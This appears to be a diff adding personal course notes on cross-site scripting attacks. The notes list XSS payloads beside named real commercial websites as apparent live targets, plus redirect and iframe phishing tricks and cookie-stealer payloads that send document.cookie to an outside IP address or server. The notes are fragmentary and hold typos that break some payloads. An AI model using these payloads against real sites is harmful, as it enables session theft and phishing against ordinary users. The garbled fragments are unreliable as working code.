@@ -1,0 +1,125 @@
+http://testphp.vulnweb.com/
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+http://orientalbirdimages.org/
+vedant"><script>alert(1)</script>
+
+https://bookmyphone.in/
+vedant<script>alert(1)</script>
+
+https://www.bewakoof.com/
+vedant" /><script>alert(1)</script>
+
+https://www.zivame.com/
+vedant</script><script>alert(1)</script>
+
+https://www.tripadvisor.in/
+vedant"><img src=x onerror=confirm(1)>
+
+https://www.bata.in/
+strips alert function
+vedant"><img src=x onerror=confirm(1)>
+vedant"><img src=x onerror=prompt(1)>
+
+https://www.carid.com/
+vedant<img src=x onerror=alert(1)>
+
+https://xsshunter.com/signup
+http://testphp.vulnweb.com/
+
+
+
+
+Burp
+referer: https://google.com/q=vedant
+
+
+
+Reflected XSS Useragent and Caching
+https://brutelogic.com.br/lab/header.php
+"https://brutelogic.com.br/lab/header.php?vedant"
+"https://brutelogic.com.br/lab/header.php?vedant" -I
+"https://brutelogic.com.br/lab/header.php?vedant" -I -H *xss:<svg onload=alert(0)>"
+
+
+XSS Email Validator Live
+"><svg/onload=confirm(1)>"@x.y
+
+
+
+Reflected XSS Protection Bypass Live 1 - Base644
+
+
+https://droom.in/
+use decoder
+
+
+https://www.optimizely.com/
+
+Right clicl disabled
+https://www.seawatersports.com/
+https://www.seawatersports.com/vedant<script>alert(1)</script>
+
+
+Blind XSS Exploitation
+
+
+
+58.Stored XSS Exploitation Live
+https://www.woodlandworldwide.com/   burp ..allowed mod at server side
+
+
+59. DOM XSS Name
+
+
+ XSS on Live by Adding Parameters
+https://www.optimizely.com/   spider..paramm
+
+
+
+63. XSS Mouse on Lab
+Wun=lnub
+<a href="javascript:alert(1)" onmouseover=alert(1)>HovermePlz</a>
+
+http://www.ubraintv.com/
+
+
+66. XSS Polyglots Live
+polyglot - knows many languages
+combine payloads
+
+
+
+
+
+68. XSS Exploitation - URL Redirection
+http://www.ubraintv.com/
+<script>document.location.href="http://hacktify.in"</script>
+<A HREF="http://127.0.0.1/injectme.js/">clickme</A>
+<A HREF="http://hacktify.in/">clickme</A>
+
+
+69. XSS Exploitation - Phishing
+<iframe src="https://hacktify.in"height="100%" width="100%"></iframe>
+
+
+70.XSS Exploitation Cookie Stealer Lab  PY LOCAL NW
+<script>document.location.href="http://192.187.64.46"1234/cookie="+documet.cookie</script>
+python -m simpleHTTPServer 1234
+
+71. XSS Exploitation Cookie Stealer Live WAN PRO STAR
+
+
+https://bookmyphone.in/
+<img src=x onerror=this.src='servername?c='+document.cookie>
+
+72. XSS Exploitation File Upload Type -2
+
+
+73. XSS Exploitation File Upload Type -3
+
+74. XSS Exploitation File Upload Type- 1
+PAYLOAD SAVE AS .HTML AND UPLOAD AND OPEN
+SRSECXYZURE.
